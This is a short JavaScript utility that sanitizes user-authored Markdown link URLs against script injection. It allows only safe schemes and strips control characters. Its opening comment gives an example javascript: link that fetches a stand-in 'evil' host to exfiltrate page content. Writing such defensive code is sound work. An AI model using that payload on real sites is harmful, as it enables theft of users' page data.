// Sanitize a URL before using it as an anchor href. Markdown bodies (KB articles,
// notes) are user-authored, and React does NOT sanitize href values — so a link
// like [x](javascript:fetch('https://evil/?d='+document.body.innerHTML)) would be a
// one-click script-injection vector (the auth cookie is httpOnly, but injected
// script can still act as the user or exfiltrate page data). We allow only safe
// schemes (and relative URLs); anything else collapses to '#'.
const ALLOWED_SCHEMES = new Set(['http', 'https', 'mailto', 'tel']);

export function safeUrl(url) {
  const raw = String(url ?? '').trim();
  if (!raw) return '#';
  // Strip control chars + whitespace (code points up to 0x20, plus DEL 0x7F) that
  // an attacker could use to obfuscate the scheme (e.g. a tab inside "javascript:").
  const cleaned = Array.from(raw)
    .filter((ch) => { const c = ch.charCodeAt(0); return c > 0x20 && c !== 0x7f; })
    .join('');
  const m = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(cleaned);
  if (m && !ALLOWED_SCHEMES.has(m[1].toLowerCase())) return '#';
  // No scheme → relative/anchor URL, which is safe.
  return raw;
}
